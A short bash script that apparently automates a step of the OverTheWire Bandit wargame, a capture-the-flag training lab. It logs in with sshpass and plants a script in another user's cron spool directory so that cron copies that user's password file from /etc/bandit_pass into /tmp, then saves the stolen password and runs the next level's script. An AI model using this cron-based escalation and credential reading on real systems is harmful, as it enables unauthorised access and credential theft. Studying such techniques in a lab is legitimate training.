#! /bin/bash

# Use of cron, crontab and shell-scripts

PASS23=$(cat ./level_pass/level23)

tput setab 1;tput setaf 7;echo 'Please wait for 65 seconds for the cron to execute...';tput sgr0

PASS24=$(sshpass -p "$PASS23" ssh bandit23@bandit.labs.overthewire.org -p 2220 "echo '#!' >/tmp/lvl230; echo '/bin/bash' >/tmp/lvl231; paste -d ' ' /tmp/lvl230 /tmp/lvl231 > /tmp/lvl232; echo 'cat /etc/bandit_pass/bandit24 > /tmp/passfor24.txt' > /tmp/lvl233; cat /tmp/lvl232 /tmp/lvl233 > /var/spool/bandit24/asimscript.sh; chmod a+x /var/spool/bandit24/asimscript.sh; sleep 65; cat /tmp/passfor24.txt")

tput setab 7;tput setaf 1;echo "Level 24 password: $PASS24";tput sgr0

echo "$PASS24" > ./level_pass/level24

chmod u+x ./level24.sh
./level24.sh
